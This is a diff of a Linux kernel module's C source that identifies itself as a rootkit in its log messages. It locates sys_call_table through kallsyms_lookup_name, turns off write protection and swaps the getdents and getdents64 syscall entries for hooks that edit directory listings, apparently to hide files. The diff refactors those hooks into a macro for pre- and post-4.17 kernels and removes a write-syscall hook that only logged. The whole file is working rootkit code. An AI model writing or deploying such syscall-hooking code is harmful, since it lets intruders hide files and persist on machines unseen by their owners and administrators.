@@ -41,27 +41,39 @@ unsigned long *syscall_table = NULL;
 
 //HOOK DEFINING
 //similar to the way kernel defines syscalls using SYSCALL_DEFINEx
-//TESTING----------------------------------------------------------------------
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct
+//similar to the way kernel defines __MAP in syscalls.h
+#define args1 regs->di
+#define args2 args1, regs->si
+#define args3 args2, regs->dx
+#define args4 args3, regs->r10
+#define args5 args4, regs->r8
+#define args6 args5, regs->r9
+#define args(n) args##n
 #define hook_define(n_args, ret_type, syscall_name, ...) \
+	asmlinkage ret_type sys_##syscall_name##_do_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret); \
+	asmlinkage ret_type (*sys_##syscall_name##_orig)(const struct pt_regs* regs); \
+	asmlinkage ret_type sys_##syscall_name##_hook(const struct pt_regs* regs){    \
+		ret_type ret = sys_##syscall_name##_orig(regs);                           \
+		return sys_##syscall_name##_do_hook(args(n_args), ret);                   \
+	}
+
+#else //normal args
+#define hook_define(n_args, ret_type, syscall_name, ...) \
+	asmlinkage ret_type sys_##syscall_name##_do_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret); \
 	asmlinkage ret_type (*sys_##syscall_name##_orig)(__MAP(n_args, __SC_DECL, __VA_ARGS__));  \
 	asmlinkage ret_type sys_##syscall_name##_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__)){     \
 		ret_type ret = sys_##syscall_name##_orig(__MAP(n_args, __SC_ARGS, __VA_ARGS__));      \
 		return sys_##syscall_name##_do_hook(__MAP(n_args, __SC_ARGS, __VA_ARGS__), ret);      \
 	}
 
-#else
-//TODO
-
 #endif
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
+hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
 //ENDTESTING-------------------------------------------------------------------
 
 
-asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret);
-asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, long ret);
-asmlinkage void sys_write_do_hook(unsigned int fd, const char __user* buf, size_t count);
-
+/*
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
 asmlinkage long (*sys_getdents_orig)(const struct pt_regs* regs);
 asmlinkage long sys_getdents_hook(const struct pt_regs* regs){
@@ -72,12 +84,6 @@ asmlinkage long (*sys_getdents64_orig)(const struct pt_regs* regs);
 asmlinkage long sys_getdents64_hook(const struct pt_regs* regs){
 	long leidos = sys_getdents64_orig(regs);
 	return sys_getdents64_do_hook(regs->di, regs->si, regs->dx, leidos);
-}
-asmlinkage long (*sys_write_orig)(const struct pt_regs* regs);
-asmlinkage long sys_write_hook(const struct pt_regs* regs){
-	long escritos = sys_write_orig(regs);
-	sys_write_do_hook(regs->di, regs->si, regs->dx);
-	return escritos;
 }
 
 #else
@@ -91,14 +97,8 @@ asmlinkage long sys_getdents64_hook(unsigned int fd, struct linux_dirent64 __use
 	long leidos = sys_getdents64_orig(fd, dirent, count);
 	return sys_getdents64_do_hook(fd, dirent, count, leidos);
 }
-asmlinkage long (*sys_write_orig)(unsigned int fd, const char __user* buf, size_t count);
-asmlinkage long sys_write_hook(unsigned int fd, const char __user* buf, size_t count){
-	long escritos = sys_write_orig(fd, buf, count);
-	sys_write_do_hook(fd, buf, count);
-	return escritos;
-}
-
 #endif
+*/
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
 	int buff_offset, deleted_size;
@@ -170,10 +170,6 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 	return ret;
 }
 
-asmlinkage void sys_write_do_hook(unsigned int fd, const char __user* buf, size_t count){
-	printk(KERN_INFO "ROOTKIT: hello from sys_write, writing %ld bytes\n", count);
-}
-
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
 	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
@@ -185,12 +181,10 @@ int __init hooks_init(void){
 
 	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
 	sys_getdents64_orig = (void*)syscall_table[__NR_getdents64];
-	sys_write_orig = (void*)syscall_table[__NR_write];
 
 	ENABLE_WRITE();
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
 	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_hook;
-	if (HOOK_WRITE) syscall_table[__NR_write] = sys_write_hook;
 	DISABLE_WRITE();
 
 	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
@@ -202,7 +196,6 @@ void __exit hooks_exit(void){
 	ENABLE_WRITE();
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
 	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_orig;
-	if (HOOK_WRITE) syscall_table[__NR_write] = sys_write_orig;
 	DISABLE_WRITE();
 
 	// delete list
